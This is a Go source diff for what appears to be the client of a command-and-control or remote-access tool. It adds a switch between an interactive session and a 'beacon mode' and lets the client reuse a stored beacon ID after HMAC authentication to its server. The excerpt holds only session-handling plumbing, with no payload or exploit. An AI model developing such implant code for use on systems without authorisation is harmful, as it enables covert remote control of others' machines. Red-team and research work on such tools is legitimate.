@@ -24,7 +24,8 @@ const (
 )
 
 // SessionHandler orchestrates the entire session lifecycle.
-func SessionHandler() error {
+// Returns (error, switchBeacon) where switchBeacon indicates if beacon mode should be activated.
+func SessionHandler() (error, bool) {
 	logger.Log("[SessionHandler] ========== SESSION HANDLER STARTED ==========")
 
 	// Decrypt state if encrypted (coming from beacon mode or idle)
@@ -32,7 +33,7 @@ func SessionHandler() error {
 		logger.Log("[SessionHandler] State is encrypted, decrypting before session operations")
 		if err := config.DecryptConfigState(); err != nil {
 			logger.Error(fmt.Sprintf("[SessionHandler] CRITICAL: Failed to decrypt state: %v", err))
-			return fmt.Errorf("failed to decrypt state: %w", err)
+			return fmt.Errorf("failed to decrypt state: %w", err), false
 		}
 		logger.Log("[SessionHandler] State decrypted successfully")
 	} else {
@@ -41,7 +42,7 @@ func SessionHandler() error {
 
 	if !isHMACKeySet() {
 		logger.Error("[SessionHandler] HMAC key is not set")
-		return fmt.Errorf("HMAC key is not set. Please provide it with the -hmac-key flag")
+		return fmt.Errorf("HMAC key is not set. Please provide it with the -hmac-key flag"), false
 	}
 	logger.Log("[SessionHandler] HMAC key validation passed")
 
@@ -51,7 +52,7 @@ func SessionHandler() error {
 	conn, err := connectToServer()
 	if err != nil {
 		logger.Error(fmt.Sprintf("[SessionHandler] Connection failed: %v", err))
-		return fmt.Errorf("failed to connect to server: %w", err)
+		return fmt.Errorf("failed to connect to server: %w", err), false
 	}
 	defer func() {
 		logger.Log("[SessionHandler] Closing connection")
@@ -73,14 +74,14 @@ func SessionHandler() error {
 	logger.Log("[SessionHandler] Starting HMAC authentication")
 	if err := performHMACAuthentication(conn); err != nil {
 		logger.Error(fmt.Sprintf("[SessionHandler] Authentication failed: %v", err))
-		return fmt.Errorf("failed to authenticate: %w", err)
+		return fmt.Errorf("failed to authenticate: %w", err), false
 	}
 	logger.Log("[SessionHandler] Server authentication successful.")
 
 	logger.Log("[SessionHandler] Sending client information to server")
 	if err := sendClientInfo(conn); err != nil {
 		logger.Error(fmt.Sprintf("[SessionHandler] Failed to send client info: %v", err))
-		return fmt.Errorf("failed to send client info: %w", err)
+		return fmt.Errorf("failed to send client info: %w", err), false
 	}
 	logger.Log("[SessionHandler] Client info sent successfully")
 
@@ -88,9 +89,18 @@ func SessionHandler() error {
 	_, _ = protocol.ReceiveData(conn) // place holder for shark listener
 	logger.Log("[SessionHandler] Initial data received, starting command handler")
 
-	commandHandler(conn)
+	err = commandHandler(conn)
 	logger.Log("[SessionHandler] ========== SESSION HANDLER ENDED ==========")
-	return nil
+
+	// Check if we're switching to beacon mode
+	// The commandHandler returns nil error when exiting normally (including beacon command)
+	// We return true to indicate beacon mode switch
+	if err == nil {
+		logger.Log("[SessionHandler] Session ended normally, checking for beacon mode switch")
+		return nil, true
+	}
+
+	return err, false
 }
 
 // isHMACKeySet checks if the HMAC key is provided and logs an error if not.
@@ -234,10 +244,21 @@ func getOS() string {
 	return os
 }
 
-// getClientID generates a unique client ID.
+// getClientID returns the existing beacon ID if available, otherwise generates a unique client ID.
 func getClientID() string {
+	// Check if we're switching from beacon mode and already have an ID
+	if config.ID != "" {
+		logger.Log(fmt.Sprintf("[SessionHandler] Reusing existing beacon ID: %s", config.ID))
+		return config.ID
+	}
+
+	// Generate new UUID for fresh session connections
 	logger.Log("[SessionHandler] Generating unique client ID")
 	id := uuid.New().String()
 	logger.Log(fmt.Sprintf("[SessionHandler] Client ID generated: %s", id))
+
+	// Store the ID in config for future use
+	config.ID = id
+
 	return id
 }
